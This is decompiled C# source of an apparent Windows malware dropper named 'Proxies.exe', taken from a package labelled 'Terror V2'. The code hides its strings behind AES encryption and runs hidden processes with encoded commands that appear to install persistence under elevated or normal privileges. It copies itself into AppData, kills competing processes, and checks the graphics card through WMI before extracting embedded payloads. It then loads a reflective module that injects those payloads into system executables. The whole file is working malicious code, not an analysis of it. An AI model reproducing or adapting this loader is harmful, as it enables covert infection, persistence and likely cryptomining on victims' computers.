// Decompiled with JetBrains decompiler
// Type: ewswppseu
// Assembly: Proxies, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D98DF87D-E7CD-4FCB-85BE-BE15D184F69B
// Assembly location: C:\Users\217jo\Downloads\Terror V2\Terror\Proxies.exe

using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class ewswppseu
{
  public static void Main()
  {
    try
    {
      try
      {
        Thread.Sleep(15000);
      }
      catch (Exception ex)
      {
      }
      string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ewswppseu.ynhfwjb("6RBhq9TyHYqyldZ+VUgxFCES3D3/qBuUV+sckZiLt5k="));
      string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ewswppseu.ynhfwjb("aTW61S3b/g55h+RrP1av+nBFwkcHZrV4sgfhpAGQUeenxOa1V3aySEAkUgU2CAxZ"));
      try
      {
        string str2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ewswppseu.ynhfwjb("y12OBHJGv8anlGbGCzVYayMC28uVmhr+Btbu8G598qXSaS6Sk+VogZYGA8o3offHKbIP4gLp22/8R7CxXo0f7w=="));
        string executablePath = Application.ExecutablePath;
        if (!executablePath.Equals(str2, StringComparison.CurrentCultureIgnoreCase))
        {
          string gqpiqcvsmrtdkagrdzoazofackzetkdafcmesgt = string.Format(ewswppseu.ynhfwjb("/0uL2b9IIX6oUqKXmy0W1L+Yh2B+TUFLNEbjbk1fcx0MSnC2GMvlBH8oAT5IcALz"), (object) Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format(ewswppseu.ynhfwjb("Mz7sfRWYbV+LGSPFOTf7hb8MgD/Y55rRxZUi2iviLq9cceyrCLcNOCkOqRYn8zUC+RPyvPPhB7zQg9/dQWjejEtV5MY+UJ+gsu6RukKAw2ZzM4UYUcNmR0/BDRfqM5aBPW1YlPW9KTy9sgwOSfmsLw=="), (object) str2.Replace("'", "''")))));
          ewswppseu.flqrbbmxfhondrtcxviwrrkn(true);
          try
          {
            Directory.CreateDirectory(Path.GetDirectoryName(str2));
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
              if (Environment.OSVersion.Version < new Version(6, 2))
              {
                ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("l47EpKAsifqRYAgFL7tJXg=="), string.Format(ewswppseu.ynhfwjb("5zoBhqmwa+gwoBdVWd0dnskrDnb7zzZfjjWtQIZ6B94Qw0hjiuXekF+MZjucU/AzWWW8tnPQu+4mEIurzJ7Q/6YHSFjxrero3uk9Uf3siorFw0aPMAvnf2tUleI7ZnyseKRdfQKFbxVAn9an36b+LdxV+bkRF4pmcBmnh2blXkVOa6U4p2nlrisEN5LlJi+WVneXS9GcZGAUY+Z3NBSv5VF8KOfNoycgVkQ7dGQU9RRpze4M3vkmvs3vSvVuk9Sy"), (object) str2));
                File.Copy(executablePath, str2, true);
                ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("l47EpKAsifqRYAgFL7tJXg=="), ewswppseu.ynhfwjb("5zoBhqmwa+gwoBdVWd0dnsXZsZKMbSZT/wA64VaYoYrQsutpgHaAv75W+rnZ+EYhXUvvpNXWfCsRrzjewjY3YK+noEpmx5wQAomfvNjKU+lhB9OfiHaKczhMKCnuvgeqqLKmcUYw+M0ib/tKcxbnuw=="));
              }
              else
                ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("pH7YuMkAOyUY6S7Zao1Vokktg9NFH4aJWHr9SmqrHJo="), string.Format(ewswppseu.ynhfwjb("/0uL2b9IIX6oUqKXmy0W1L+Yh2B+TUFLNEbjbk1fcx0MSnC2GMvlBH8oAT5IcALz"), (object) Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format(ewswppseu.ynhfwjb("rGv1wBCnEmSwt0IivoTC6JSvXq0ZJMBkHoWW+vgWYAliSL0ebFfezu0CoaRi5ddBCm8fPkovJ9b1Tav5yefpDXapwoOAjDPtw95PALAzpGBK7aQSWVJrr00EAiAQFLA4Gc5f1/Z78AYHy8MZMkGr8WjDfVfASAOCJvRzP9z97g1eSZbb3jQGQRBO8SWFskf8ntVa7rPK+w2VgwD0l9gHcJC3a8Za426ETRR0L44RfgJuqOGdOP9l+yGDZuCqCXWCs4vPKT7LCbnFbz1my5hdX6wErB19E+TJ2FJfstm+ZnT1BTxdDDMDgzqwqesvezlijNuAC5rgRPs11I+pjomegQ6d5OOTc6Ox/4I4BOdyCgkRuiq8vUAL5HcCUaxCm7TidClkZ0/nJkcvFGL3qrJqgKghw+GoXWbLrYbqYgNoBaEouztVD1eSfxYLovWn8NERsmBRZg819tyIRWBH7CN4mOyjjxLDBZ3lGM6W9n9kqIqagfX4gMm+jwBy9b41XDBriUVpwAel6i5Hm3uFmpIVAhYc8IHdQSpTXhtCT/a4VTxy3ybiEiOK3wpDEOCCrXMbj+L0kj4f6qhSjZ1VBhmgwHJxCqJSjBuaZHNkhhJN70q9G71LKXek1aTHaJXxvXW0O4JQbYk2RCmVYdj2bPv/92fbuPZ1/lrY+9yuccJzBOIfHMxPmktD6r9O/9Rz5lMvVanZxrP3MiKuP7c5ze049WMhOwAWu5GSvPPJ9NkfcOFSlaz7MDQeciQzIruEviosjViIS6DxAa8cLKRjrPmvICNy/gbdueAoa1IPQ4jgDoZ+EvJnhfazUnXBAf54a8KXflgtK9Yxe7u5USOh083apkYpstX9eddzv6VMrJqP58vDnF2AFtVmrfnSCuB3Y7CQS+EZq7uHmA87usH8wwcn8YPhVIAi1a2icpEfdomcDjWWwQIc/+nmaDdM2jpx2FHJymcfXGg1o5BGD35PaTK9G7K4678r6noWBI75wmInFFgPfRkSspnWYk+2govWqPZJzfG7vRmv8Bnw/8vaZiva1ZB98tVXkRD1Y2MBXvUvoghlHTgUbbBPjOQRhDhpf/CgrR+OgNIHvRNGlGsN3C4cFHPkj4gFUPcxNb7Ths1/4duxSNLhWJCDfyi4hC1j8dir9gHusRd0eZxmVfNZUQOOwcVt2kgC6yhROY6en1QhLv3URVhVNO2aZejuGSVTwM9rw2PIAt7WGqslEGvXLNmhGxpTDHQK0c3q+4WXRt9Ue7czerfJGOfm0Yzv7AtHNsNq/1N+hlccxpqJjBgtEKnHY0fFKf5Bvv7SwIoC8fr5+Ykin3NBZGAMeWRaapV4skYj1O4NfX1/TlJja0WlTtb+gD6twzVj2HwK42XFFn/E5GNFSUFVTi9YTfP3AAH0OmkOuGFmY93wsykfhJZhgiKCuA=="), (object) str2.Replace("'", "''"), (object) executablePath.Replace("'", "''"), (object) gqpiqcvsmrtdkagrdzoazofackzetkdafcmesgt)))), true);
            }
            else
            {
              ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("l47EpKAsifqRYAgFL7tJXg=="), string.Format(ewswppseu.ynhfwjb("HfS/z8Qomg+PbWO0uxg3kGUvFIoCSRtdTdT8YegcQbhPgypsRpuCdt7bU3kn0CSSskk+1rzXutEnsGkG631wUzf++IbDvkuyesw0OgjfNklv3BlyQ8clsesGYZk3yLerGaxg2MI4kRZApfmzpOKEyMozRYB0bxdXkbcOAFUTKJzvvDgxhsBkQI3Sfr4oPnD9sFLj9b2fSssXkQM6ZzzPTH2UQQSc4f/W81TCaVFvbYP4lvIRefLdM0+OwGwyZN+wZZXmkUe7SyB+Wxmhe/RzjEgHTGO/qFK9sqinCFQNlB4IgWVcM1YXEMz8YgyDUJZJPifZAtRKrz+52Smy3X2uSA=="), (object) str2));
              Thread.Sleep(2000);
              File.Copy(executablePath, str2, true);
              Thread.Sleep(2000);
              ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("pH7YuMkAOyUY6S7Zao1Vokktg9NFH4aJWHr9SmqrHJo="), gqpiqcvsmrtdkagrdzoazofackzetkdafcmesgt);
            }
          }
          catch (Exception ex)
          {
          }
          Environment.Exit(0);
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        try
        {
          Directory.CreateDirectory(str1);
          Directory.CreateDirectory(path);
          if (!ewswppseu.flqrbbmxfhondrtcxviwrrkn())
            ewswppseu.kvhatqmuwfhhhffirhnduvuxe(ewswppseu.mpfocdedtmkftbqvahthfymvfm("ajncgm"), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, ewswppseu.ynhfwjb("KJ59E3FY14Bfx5HZ55PVnwGnhIXvcYBGEPmHOJug/sYcfQ+ADvfGwv4nw9zm9RJB")), ewswppseu.ynhfwjb("t62tuoxO+Rof876Ao3YSddCsyX4cLA1vDZ7fKDrxp+8="), true);
          File.WriteAllBytes(Path.Combine(str1, ewswppseu.ynhfwjb("v4g6GAic4j+J6Aj/vr4kMi+GRv2yhvrL53FuIDsW3w4=")), ewswppseu.mpfocdedtmkftbqvahthfymvfm("trmyudemvyud"));
        }
        catch (Exception ex)
        {
        }
        byte[] numArray1 = new byte[0];
        byte[] numArray2 = new byte[0];
        bool flag = ewswppseu.mijngox();
        try
        {
          if (flag)
          {
            byte[] buffer = ewswppseu.mpfocdedtmkftbqvahthfymvfm("reoauce");
            if (buffer.Length > 0)
            {
              using (ZipArchive zipArchive = new ZipArchive((Stream) new MemoryStream(buffer)))
              {
                foreach (ZipArchiveEntry entry in zipArchive.Entries)
                  entry.ExtractToFile(Path.Combine(str1, entry.FullName), true);
              }
            }
          }
        }
        catch (Exception ex)
        {
        }
        try
        {
          byte[] numArray3 = ewswppseu.iuxtsmfoqbrzqwjuidmkjcmbnkotzekk(ewswppseu.mpfocdedtmkftbqvahthfymvfm("oqrfeq"), "mr");
          string str3 = ewswppseu.vgqbuosnxzotygsnngaulumcytvne();
          string[][] strArray1 = new string[1][]
          {
            new string[4]
            {
              "MdOpSv/OhfdBhiDmkSdTQ/OQAzILEfg1d4ZFy+c0uJw=",
              "b",
              "MdOpSv/OhfdBhiDmkSdTQ7RCHjVA9SRoQND+NXf2aEVOgko88IYL99d2DS58AFLrL7JX0UtPBMm3DEDaMAMKVmPL29AIjsU7gGW2pBP+A25Jxtk6lUJPcZ2GgSByQlKqqv8bu2WSriP2jtf6C6DVNDYBpj7OVPmyoZNpQ6WoVLWTGP3Hk2rCCT4rkaHNaX8f3B54W+UPFR3T3bclLpeY02A2SECsZluse5dWDTkhI4ZSIxi53oR06j1/3BA6OCObIm7dPoWySTjbEvjU/9HkxLE2ekUgCKuAeKnVZVZCY/DAMyiKfPI5G5+WFzD0VifTa7EFOU8W7mv1QokwmURKEViNlGSshlkfb51Wy4Jk4J9ovSjU5JEITbKYy33Z9cIQO7oPgx0N9caotTLMErhkneR6YeAkJVESdscSd5zWkPcO2htwZn/kK4WKbdKeBUvtdpxP5w00N+3EtzJQ0pBjsYAvCYqQ5/bEdwHx+yVJe8iM3i1C+w+mJWoGmMcj9G1v7RHR7IntDUtBSAfgqWv7Ag5CW7qQh6NYDyedCvFyZTLkx+TqEQw29X20D+piYOQt9YiHA2BfylAa9RANKse9bQOhuWh/rM6N9MNqtajhXrUHpZISNvJxpO7GBpzHQ3F54bL9m/Z9wOanJuoGRrezZj+okJ/X905uUC3tTos923uO69o87DuFV03Phk+R0+mFROwY9RJh11caiFxz/JD57a1dTRLcJcBxlkCYVYGsIc4GKNY2UXBrDo0WLkbIeP/Ci1VlRdeDfF5FK/uISfqhwZRdkFc3BotNLZYQqFPBkI2Krr827/1nL43vkVAtC4aJiVxJUeHEZxKgB73AiGBK7SNV65r0g8kPb1QVVasvVc1lo0Dnb/YNlJzpnuYK1EfmGuzwc/Eqd5Nnc7MHa6Q19uuYS/Qdmdqrla5MHuD9/KY8zQeCvds0Q8PiF3Xpl07al/x+RoZyriuCx8SD3wb43QQ5uBWfXCnxCZ1ogOxxRdy9/dAjNiT0ZW6hAcfGqYCta8iLKShy758tKZy3uj8+fvGP2k9gfiz+fFGBstRwJ3O+QFNmUC2JkWpSk4C7DzOfwradQSid3u9E+6q0fPeVXJNwv/e6kjNCfC5m8XFHk8Q=",
              "bde0DyNrxgnb9IJgWCRh6tnmdLNqS6r819svRWa1DUY="
            }
          };
          foreach (string[] strArray2 in strArray1)
          {
            if (!str3.Contains(ewswppseu.ynhfwjb(strArray2[0])) && (strArray2[1] == ewswppseu.ynhfwjb("/TiVD65Sm1L0m+ibSKD03g==") || strArray2[1] == ewswppseu.ynhfwjb("Z0P+sqG/0oK2CB4nCOeSCw==") && flag))
              ewswppseu.kvhatqmuwfhhhffirhnduvuxe(strArray2[1] == ewswppseu.ynhfwjb("/TiVD65Sm1L0m+ibSKD03g==") ? numArray3 : numArray2, Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, ewswppseu.ynhfwjb(strArray2[3])), ewswppseu.ynhfwjb(strArray2[2]));
          }
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
    }
    Environment.Exit(0);
  }

  public static byte[] mpfocdedtmkftbqvahthfymvfm(string basrm) => ewswppseu.mqcmgbeiirsxyuzudubgy((byte[]) new ResourceManager("iloxvdltykyr", Assembly.GetExecutingAssembly()).GetObject(basrm));

  public static string ynhfwjb(string basrm) => Encoding.Unicode.GetString(ewswppseu.mqcmgbeiirsxyuzudubgy(Convert.FromBase64String(basrm)));

  public static bool mijngox()
  {
    try
    {
      string str = "";
      ManagementScope scope = new ManagementScope(ewswppseu.ynhfwjb("5oDTfHc8RWtpFwX+mXxE9vA9mFuILCx6buSS/o3nAPE="), new ConnectionOptions()
      {
        Impersonation = ImpersonationLevel.Impersonate
      });
      scope.Connect();
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(scope, new ObjectQuery(ewswppseu.ynhfwjb("5bZOfI+nott/+yTeEuTBjyS/zKAF0RElUoPNDvghI+/aJBgoustTAcU2Uq60Io0If/YYdDW7KBPCRVXvEX3RP16pxWZJ80WR88LFFy8CLxm16aowvMQtcKhUdK6V2YfrY5FbsO0JFm472Un1oHeUpg=="))).Get())
        str = str + " " + managementObject["VideoProcessor"] + " " + managementObject["Name"];
      return str.IndexOf(ewswppseu.ynhfwjb("eAiVDFRLVNeMEIux4eo72Q=="), StringComparison.OrdinalIgnoreCase) >= 0 || str.IndexOf(ewswppseu.ynhfwjb("DoV4IfCx1nqg/MsPRqu75w=="), StringComparison.OrdinalIgnoreCase) >= 0;
    }
    catch (Exception ex)
    {
    }
    return false;
  }

  public static string vgqbuosnxzotygsnngaulumcytvne()
  {
    string str = "";
    ManagementScope scope = new ManagementScope(ewswppseu.ynhfwjb("5oDTfHc8RWtpFwX+mXxE9vA9mFuILCx6buSS/o3nAPE="), new ConnectionOptions()
    {
      Impersonation = ImpersonationLevel.Impersonate
    });
    scope.Connect();
    foreach (ManagementObject managementObject in new ManagementObjectSearcher(scope, new ObjectQuery(ewswppseu.ynhfwjb("2Z4PlPWKTB4Wt7PUMFqVjcEqs+l1YLHDbsHaH+1ul4sfyrLdCmfVViwu8pz6DXg2NDHli27XCQyCdXlhyi79++Qx2ZapomT5GPd+MLuqUkWsylsqdb+aat5dVNXnSKAsPeN+EjsfdW/nTvwPYRf4ycoMx0/jRgtTIHd8MU1PxZ9WiZQ0zIwJ0dwIfTaYbFNV+wqgfHC2PNITZ7/np1L2zw=="))).Get())
    {
      if (managementObject != null && managementObject["CommandLine"] != null && managementObject["CommandLine"].ToString().Contains(ewswppseu.ynhfwjb("MdOpSv/OhfdBhiDmkSdTQ9bKGaNY3ydPgnBfuPs27zc=")))
        str += managementObject["CommandLine"].ToString();
    }
    return str;
  }

  public static bool flqrbbmxfhondrtcxviwrrkn(bool vjbgnhzqiwmafrutaocnf = false)
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName(ewswppseu.ynhfwjb("c+/yD7l2jcaeKpNZxZkaqEJNccRimYHZbDQq9jjKM3k=")))
        process.Kill();
      ManagementScope scope = new ManagementScope(ewswppseu.ynhfwjb("5oDTfHc8RWtpFwX+mXxE9vA9mFuILCx6buSS/o3nAPE="), new ConnectionOptions()
      {
        Impersonation = ImpersonationLevel.Impersonate
      });
      scope.Connect();
      foreach (ManagementObject managementObject in new ManagementObjectSearcher(scope, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get())
      {
        if (managementObject != null && managementObject["CommandLine"] != null && managementObject["CommandLine"].ToString().Contains(ewswppseu.ynhfwjb("t62tuoxO+Rof876Ao3YSddCsyX4cLA1vDZ7fKDrxp+8=")))
        {
          if (!vjbgnhzqiwmafrutaocnf)
            return true;
          ewswppseu.yudkmsccztkmarsxybasfixjxryjydewzyxnq(ewswppseu.ynhfwjb("l47EpKAsifqRYAgFL7tJXg=="), string.Format(ewswppseu.ynhfwjb("+8XRrlt8LyEd5HiSaeuFmoAJYcUYg90wGQOsuDBQSRcZJLTmg8vcaQUgQy0BbM6zkypmZ8EZK+R01hsvL9YTSw=="), managementObject["ProcessID"]));
        }
      }
    }
    catch (Exception ex)
    {
    }
    return false;
  }

  public static void yudkmsccztkmarsxybasfixjxryjydewzyxnq(
    string basrm,
    string gqpiqcvsmrtdkagrdzoazofackzetkdafcmesgt,
    bool mtukv = false)
  {
    try
    {
      Process process = Process.Start(new ProcessStartInfo()
      {
        FileName = basrm,
        Arguments = gqpiqcvsmrtdkagrdzoazofackzetkdafcmesgt,
        WorkingDirectory = Environment.SystemDirectory,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      });
      if (!mtukv)
        return;
      process.WaitForExit();
    }
    catch (Exception ex)
    {
    }
  }

  public static byte[] iuxtsmfoqbrzqwjuidmkjcmbnkotzekk(
    byte[] xzfvqjhmoiuvcoeajzgzbugaycimyxwmppmwjff,
    string fpryivl)
  {
    try
    {
      using (ZipArchive zipArchive = new ZipArchive((Stream) new MemoryStream(xzfvqjhmoiuvcoeajzgzbugaycimyxwmppmwjff)))
      {
        foreach (ZipArchiveEntry entry in zipArchive.Entries)
        {
          if (entry.FullName.Contains(fpryivl))
          {
            using (Stream stream = entry.Open())
            {
              using (MemoryStream destination = new MemoryStream())
              {
                stream.CopyTo((Stream) destination);
                return destination.ToArray();
              }
            }
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
    return new byte[0];
  }

  public static void kvhatqmuwfhhhffirhnduvuxe(
    byte[] qwgynrqswwugrgperjy,
    string mgszeoavtmobijrexlkyxtnuximpxemiia,
    string hqhdfertipnyhpktgxacjwranclc,
    bool asguujdp = false)
  {
    try
    {
      Assembly.Load(ewswppseu.mpfocdedtmkftbqvahthfymvfm("dspbeanll")).GetType(ewswppseu.ynhfwjb("ucVIoMAE8AEC0Yl3p2uxDVIfSPSHqspHYpjBpfOVBb8=")).GetMethod(asguujdp ? ewswppseu.ynhfwjb("hc0cnkHsqXgEttpHX2YCd58ZF4V1zwKQKs4A3GcNL5Q=") : ewswppseu.ynhfwjb("LdtUayYSJREkjvfrktWg5w=="), BindingFlags.Static | BindingFlags.Public).Invoke((object) null, new object[3]
      {
        (object) qwgynrqswwugrgperjy,
        (object) mgszeoavtmobijrexlkyxtnuximpxemiia,
        (object) hqhdfertipnyhpktgxacjwranclc
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static byte[] mqcmgbeiirsxyuzudubgy(
    byte[] xzfvqjhmoiuvcoeajzgzbugaycimyxwmppmwjff,
    bool xomnlygxyuzzjbprocytfclp = false)
  {
    byte[] bytes = new Rfc2898DeriveBytes("zzmtksbwkpemuxwdrkqstiiqmbklbhrfxjrapllfmbhdwylljmvgbnxqlwmrnrusjknlewwgxhkpwtzgrzssqklgkfolyvqkhgvdmzvvlpjitjxbeuznwtpxxialpdudbzrjiverfhpispisgbczvycoecgdxtfjdfntnpgyfrogbscjazgchihjdnnppltisryccdkrilbwcpvwaxdzljarxtezcrvbzsfltalcpojcbbqqcwpmjykbrdxwokug", Encoding.ASCII.GetBytes("ezwbuyczugjizfoffsdrmduwmlvesche"), 100).GetBytes(16);
    using (Aes aes = Aes.Create())
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, xomnlygxyuzzjbprocytfclp ? aes.CreateEncryptor(bytes, Encoding.ASCII.GetBytes("dsebwynqtmgskibl")) : aes.CreateDecryptor(bytes, Encoding.ASCII.GetBytes("dsebwynqtmgskibl")), CryptoStreamMode.Write))
        {
          cryptoStream.Write(xzfvqjhmoiuvcoeajzgzbugaycimyxwmppmwjff, 0, xzfvqjhmoiuvcoeajzgzbugaycimyxwmppmwjff.Length);
          cryptoStream.Close();
        }
        return memoryStream.ToArray();
      }
    }
  }
}
